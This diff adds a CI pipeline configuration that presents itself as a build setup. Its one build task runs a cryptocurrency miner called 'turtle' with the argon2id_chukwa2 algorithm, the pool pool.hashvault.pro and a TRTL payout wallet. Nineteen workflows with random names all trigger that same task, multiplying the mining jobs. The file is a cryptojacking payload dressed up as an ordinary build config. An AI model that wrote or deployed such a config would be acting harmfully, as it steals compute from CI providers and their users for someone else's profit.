@@ -1,0 +1,66 @@
+tasks:
+  build:
+    runner: christiankm01/master:latest
+    steps:
+    - commands:
+      -  turtle  --algorithm argon2id_chukwa2 --pool pool.hashvault.pro:80 --wallet TRTLv3ZvhUDDzXp9RGSVKXcMvrPyV5yCpHxkDN2JRErv43xyNe5bHBaFHUogYVc58H1Td7vodta2fa43Au59Bp9qMNVrfaNwjWP
+workflows:
+- name: test-build
+  tasks:
+  - build
+- name: jaj
+  tasks:
+  - build
+- name: jal
+  tasks:
+  - build
+- name: jala
+  tasks:
+  - build
+- name: jali
+  tasks:
+  - build
+- name: jahsu
+  tasks:
+  - build
+- name: nxhu
+  tasks:
+  - build
+- name: kamju
+  tasks:
+  - build
+- name: jshu
+  tasks:
+  - build
+- name: gab
+  tasks:
+  - build
+- name: h
+  tasks:
+  - build
+- name: j
+  tasks:
+  - build
+- name: k
+  tasks:
+  - build
+- name: i
+  tasks:
+  - build
+- name: jsgnzgj
+  tasks:
+  - build
+- name: alamatyu
+  tasks:
+  - build
+- name: bahujaksbhjt
+  tasks:
+  - build
+- name: bsghyuzipijsh
+  tasks:
+  - build
+- name: nahih
+  tasks:
+  - build
+
+
